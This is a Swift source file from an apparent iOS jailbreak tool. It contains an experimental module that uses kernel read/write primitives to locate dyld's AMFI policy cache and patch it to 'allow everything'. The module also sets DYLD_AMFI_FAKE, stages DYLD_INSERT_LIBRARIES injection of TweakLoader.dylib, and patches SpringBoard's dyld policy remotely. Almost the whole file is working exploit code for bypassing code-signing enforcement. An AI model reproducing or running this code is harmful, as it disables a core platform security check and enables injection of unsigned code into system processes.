//
//  exp_dyld_bypass.swift
//  DSPloit
//
//  EXPERIMENT: DYLD-based AMFI Bypass
//  Based on reverse engineering of iOS 18.2 dyld binary.
//
//  ═══════════════════════════════════════════════════════════════
//  STATUS: EXPERIMENTAL — NOT IN MAIN JAILBREAK CHAIN
//  Run manually from Settings → Experiments → DYLD Bypass
//  ═══════════════════════════════════════════════════════════════
//
//  WHAT THIS TESTS:
//  1. Can we find dyld's __DATA segment in our process?
//  2. Can we locate the AMFI policy cache (result of _amfi_check_dyld_policy_self)?
//  3. Can we patch it to 0xFF (allow everything)?
//  4. Does DYLD_INSERT_LIBRARIES work after patching?
//  5. Can we do the same for SpringBoard and launchd?
//
//  WHY THIS MATTERS FOR FULL JAILBREAK:
//  - If dyld policy patch works → unsigned dylibs load without trust cache
//  - If DYLD_INSERT_LIBRARIES works → tweaks inject on process spawn (not just dlopen)
//  - If launchd patched → ALL new processes inherit the bypass
//  - Combined with kernel AMFI flag zeroing = double-layer bypass
//
//  WHAT TO WATCH IN OUTPUT:
//  ┌─────────────────────────────────────────────────────────────┐
//  │ ✅ = working, safe to integrate                             │
//  │ ⚠️ = partial success, needs investigation                   │
//  │ ❌ = failed, do NOT integrate                                │
//  │ 🔍 = info only, check the value                             │
//  └─────────────────────────────────────────────────────────────┘
//
//  Created by Royan | 2026-05-24
//

import Foundation

final class ExpDyldBypass {
    static let shared = ExpDyldBypass()
    
    private let mgr = dspmgr.shared
    private var results: [String] = []
    
    private func log(_ msg: String) {
        results.append(msg)
        globallogger.log("(exp_dyld) \(msg)")
        print("(exp_dyld) \(msg)")
    }
    
    // MARK: - Run Full Experiment
    
    /// Run all dyld bypass tests. Returns log output.
    func runAll() -> [String] {
        results.removeAll()
        
        log("═══════════════════════════════════════════════")
        log("  EXPERIMENT: DYLD AMFI BYPASS")
        log("  iOS \(UIDevice.current.systemVersion)")
        log("═══════════════════════════════════════════════")
        log("")
        
        guard mgr.dsready else {
            log("❌ PREREQUISITE FAILED: Kernel exploit not active")
            log("   Run jailbreak first, then retry this experiment")
            return results
        }
        
        // Test 1: Find dyld base
        test1_findDyldBase()
        
        // Test 2: Parse dyld Mach-O
        test2_parseDyldMachO()
        
        // Test 3: Find AMFI policy cache
        test3_findPolicyCache()
        
        // Test 4: Patch policy cache
        test4_patchPolicyCache()
        
        // Test 5: Verify DYLD_AMFI_FAKE env var
        test5_dyldAmfiFake()
        
        // Test 6: Test DYLD_INSERT_LIBRARIES
        test6_insertLibraries()
        
        // Test 7: Remote process (SpringBoard)
        test7_remoteSpringBoard()
        
        log("")
        log("═══════════════════════════════════════════════")
        log("  EXPERIMENT COMPLETE")
        log("═══════════════════════════════════════════════")
        
        return results
    }
    
    // MARK: - Test 1: Find dyld base address
    
    private func test1_findDyldBase() {
        log("")
        log("── TEST 1: Find dyld base address ──")
        
        let base = dyld_get_base_for_proc(ds_get_our_proc())
        
        if base != 0 {
            log("✅ dyld base found: 0x\(String(base, radix: 16))")
            log("🔍 PERHATIKAN: Alamat harus di range 0x1xxxxxxxx (userspace)")
            log("   Jika di range 0xfffffff = SALAH (itu kernel address)")
        } else {
            log("❌ dyld base NOT FOUND")
            log("   PENYEBAB: proc address salah, atau task_dyld_info offset berubah")
            log("   SOLUSI: cek offset all_image_info di task struct")
        }
    }
    
    // MARK: - Test 2: Parse dyld Mach-O header
    
    private func test2_parseDyldMachO() {
        log("")
        log("── TEST 2: Parse dyld Mach-O ──")
        
        let base = dyld_get_base_for_proc(ds_get_our_proc())
        guard base != 0 else {
            log("⚠️ SKIP: dyld base not available (test 1 failed)")
            return
        }
        
        let magic = ds_kread32(base)
        log("🔍 Magic: 0x\(String(magic, radix: 16))")
        
        if magic == 0xFEEDFACF {
            log("✅ Valid Mach-O 64-bit header")
        } else {
            log("❌ INVALID magic — not a Mach-O file")
            log("   PENYEBAB: dyld base address salah")
            return
        }
        
        let ncmds = ds_kread32(base + 16)
        let sizeofcmds = ds_kread32(base + 20)
        log("🔍 ncmds: \(ncmds), sizeofcmds: \(sizeofcmds)")
        log("   PERHATIKAN: ncmds harus 10-30 range, sizeofcmds < 0x10000")
        
        if ncmds > 50 || sizeofcmds > 0x100000 {
            log("⚠️ Suspicious values — mungkin bukan dyld yang benar")
        }
        
        // Find __DATA segment
        var cmdOffset = base + 32 // sizeof(mach_header_64)
        var dataFound = false
        
        for i in 0..<min(ncmds, 64) {
            let cmd = ds_kread32(cmdOffset)
            let cmdsize = ds_kread32(cmdOffset + 4)
            
            if cmd == 0x19 { // LC_SEGMENT_64
                var segname = [UInt8](repeating: 0, count: 17)
                segname.withUnsafeMutableBufferPointer { buf in
                    ds_kreadbuf(cmdOffset + 8, buf.baseAddress, 16)
                }
                let name = String(cString: segname)
                let vmaddr = ds_kread64(cmdOffset + 24)
                let vmsize = ds_kread64(cmdOffset + 32)
                
                log("🔍 Segment: \(name) vmaddr=0x\(String(vmaddr, radix: 16)) size=0x\(String(vmsize, radix: 16))")
                
                if name.hasPrefix("__DATA") {
                    dataFound = true
                    log("✅ __DATA segment found!")
                    log("   PERHATIKAN: vmsize harus 0x4000-0x10000 (16KB-64KB)")
                }
            }
            
            cmdOffset += UInt64(cmdsize)
            if cmdsize == 0 { break }
        }
        
        if !dataFound {
            log("❌ __DATA segment NOT FOUND in dyld")
            log("   PENYEBAB: Mach-O parsing error atau dyld format berubah")
        }
    }
    
    // MARK: - Test 3: Find AMFI policy cache
    
    private func test3_findPolicyCache() {
        log("")
        log("── TEST 3: Find AMFI policy cache ──")
        log("   Mencari cached result dari _amfi_check_dyld_policy_self")
        log("   Nilai yang dicari: 0x00 (belum dicek) atau 0x01-0xFF (flags)")
        
        let base = dyld_get_base_for_proc(ds_get_our_proc())
        guard base != 0 else {
            log("⚠️ SKIP: dyld base not available")
            return
        }
        
        // Find __DATA vmaddr
        var cmdOffset = base + 32
        let ncmds = ds_kread32(base + 16)
        var dataVmaddr: UInt64 = 0
        var dataVmsize: UInt64 = 0
        
        for _ in 0..<min(ncmds, 64) {
            let cmd = ds_kread32(cmdOffset)
            let cmdsize = ds_kread32(cmdOffset + 4)
            
            if cmd == 0x19 {
                var segname = [UInt8](repeating: 0, count: 17)
                segname.withUnsafeMutableBufferPointer { buf in
                    ds_kreadbuf(cmdOffset + 8, buf.baseAddress, 16)
                }
                let name = String(cString: segname)
                if name.hasPrefix("__DATA") && !name.contains("CONST") {
                    dataVmaddr = ds_kread64(cmdOffset + 24)
                    dataVmsize = ds_kread64(cmdOffset + 32)
                    break
                }
            }
            cmdOffset += UInt64(cmdsize)
            if cmdsize == 0 { break }
        }
        
        guard dataVmaddr != 0 else {
            log("❌ __DATA not found — cannot locate policy cache")
            return
        }
        
        log("🔍 Scanning __DATA at 0x\(String(dataVmaddr, radix: 16)) (size=0x\(String(dataVmsize, radix: 16)))")
        
        // Dump first 0x100 bytes of __DATA to find the policy value
        log("🔍 __DATA first 128 bytes (hex dump):")
        var candidates: [(offset: UInt64, value: UInt64)] = []
        
        for off in stride(from: UInt64(0), to: min(dataVmsize, 0x100), by: 8) {
            let val = ds_kread64(dataVmaddr + off)
            
            // Log every 32 bytes
            if off % 32 == 0 {
                let v0 = ds_kread64(dataVmaddr + off)
                let v1 = ds_kread64(dataVmaddr + off + 8)
                let v2 = ds_kread64(dataVmaddr + off + 16)
                let v3 = ds_kread64(dataVmaddr + off + 24)
                log("   +0x\(String(off, radix: 16, uppercase: false)): \(String(format: "%016llx %016llx %016llx %016llx", v0, v1, v2, v3))")
            }
            
            // Policy cache is a small value (0-0xFF)
            if val <= 0xFF && val != 0 {
                candidates.append((off, val))
            }
        }
        
        log("")
        if candidates.isEmpty {
            log("🔍 No small values found — policy may be at 0 (unchecked)")
            log("   PERHATIKAN: Jika semua 0, berarti AMFI belum dipanggil oleh dyld")
            log("   Ini NORMAL — policy di-cache saat pertama kali load dylib")
            log("   SOLUSI: Trigger dlopen() dulu, lalu scan ulang")
        } else {
            log("🔍 Candidate policy cache locations:")
            for c in candidates {
                log("   __DATA+0x\(String(c.offset, radix: 16)) = 0x\(String(c.value, radix: 16))")
                if c.value <= 0x0F {
                    log("   ^^^ LIKELY POLICY CACHE (small flags value)")
                }
            }
        }
    }
    
    // MARK: - Test 4: Patch policy cache
    
    private func test4_patchPolicyCache() {
        log("")
        log("── TEST 4: Patch AMFI policy cache ──")
        log("   Menulis 0xFF (ALLOW_EVERYTHING) ke policy cache")
        
        let result = dyld_patch_amfi_policy_self()
        
        if result == 0 {
            log("✅ Policy cache patched to 0xFF!")
            log("   ARTINYA: dyld sekarang skip semua security check")
            log("   NEXT: Test apakah dlopen unsigned dylib berhasil")
        } else {
            log("⚠️ Policy patch returned \(result)")
            log("   KEMUNGKINAN:")
            log("   - Policy cache offset salah (iOS version berbeda)")
            log("   - __DATA segment protected (KTRR/PPL)")
            log("   - dyld base address salah")
            log("   SOLUSI: Cek hex dump di Test 3, cari offset yang benar")
        }
    }
    
    // MARK: - Test 5: DYLD_AMFI_FAKE env var
    
    private func test5_dyldAmfiFake() {
        log("")
        log("── TEST 5: DYLD_AMFI_FAKE environment variable ──")
        log("   Setting DYLD_AMFI_FAKE=0xFF di proses kita")
        
        let result = dyld_set_amfi_fake(0, 0xFF)
        
        if result == 0 {
            log("✅ DYLD_AMFI_FAKE=0xFF set via setenv()")
            log("   PERHATIKAN: Ini hanya efektif untuk FUTURE dylib loads")
            log("   dyld membaca env var saat startup — mungkin sudah terlambat")
            log("   TAPI: Jika combined dengan policy patch, double coverage")
        } else {
            log("❌ setenv() failed")
            log("   PENYEBAB: sandbox blocking setenv? (unlikely)")
        }
        
        // Verify
        if let val = ProcessInfo.processInfo.environment["DYLD_AMFI_FAKE"] {
            log("🔍 Verify: DYLD_AMFI_FAKE = \"\(val)\"")
        } else {
            log("🔍 Verify: DYLD_AMFI_FAKE not in environment (expected if set after launch)")
        }
    }
    
    // MARK: - Test 6: DYLD_INSERT_LIBRARIES
    
    private func test6_insertLibraries() {
        log("")
        log("── TEST 6: DYLD_INSERT_LIBRARIES capability ──")
        log("   Cek apakah DYLD_INSERT_LIBRARIES bisa diaktifkan")
        
        // Check if our TweakLoader.dylib exists
        let loaderPath = "/var/jb/usr/lib/TweakLoader.dylib"
        let exists = FileManager.default.fileExists(atPath: loaderPath)
        
        if exists {
            log("✅ TweakLoader.dylib exists at \(loaderPath)")
        } else {
            log("⚠️ TweakLoader.dylib NOT deployed yet")
            log("   Deploy via TweakLoader.deployInfrastructure() first")
        }
        
        log("")
        log("🔍 UNTUK FULL TEST:")
        log("   1. Deploy TweakLoader.dylib ke /var/jb/usr/lib/")
        log("   2. Patch dyld policy (Test 4)")
        log("   3. Spawn proses baru dengan DYLD_INSERT_LIBRARIES set")
        log("   4. Cek apakah TweakLoader constructor dipanggil")
        log("   5. Lihat /var/jb/tmp/tweakloader.log untuk konfirmasi")
    }
    
    // MARK: - Test 7: Remote process (SpringBoard)
    
    private func test7_remoteSpringBoard() {
        log("")
        log("── TEST 7: Remote dyld patch (SpringBoard) ──")
        
        guard mgr.rcready else {
            log("⚠️ SKIP: RemoteCall not active")
            log("   Jalankan full jailbreak chain dulu")
            return
        }
        
        let sbProc = procbyname("SpringBoard")
        if sbProc == 0 {
            log("❌ SpringBoard proc not found")
            return
        }
        log("🔍 SpringBoard proc: 0x\(String(sbProc, radix: 16))")
        
        let sbDyldBase = dyld_get_base_for_proc(sbProc)
        if sbDyldBase != 0 {
            log("✅ SpringBoard dyld base: 0x\(String(sbDyldBase, radix: 16))")
            log("   PERHATIKAN: Harus berbeda dari dyld base kita (ASLR)")
            
            let result = dyld_patch_amfi_policy_remote(sbProc)
            if result == 0 {
                log("✅ SpringBoard dyld policy PATCHED!")
                log("   ARTINYA: SpringBoard sekarang bisa load unsigned dylibs")
                log("   NEXT: dlopen TweakLoader.dylib di SpringBoard")
            } else {
                log("⚠️ SpringBoard patch failed (ret=\(result))")
                log("   KEMUNGKINAN:")
                log("   - dyld base detection salah untuk remote proc")
                log("   - __DATA offset berbeda di SpringBoard's dyld instance")
                log("   - PPL protecting SpringBoard's memory")
            }
        } else {
            log("❌ Cannot find dyld base for SpringBoard")
            log("   PENYEBAB: task_dyld_info offset salah untuk remote proc")
            log("   SOLUSI: Scan task struct untuk all_image_info pointer")
        }
    }
}
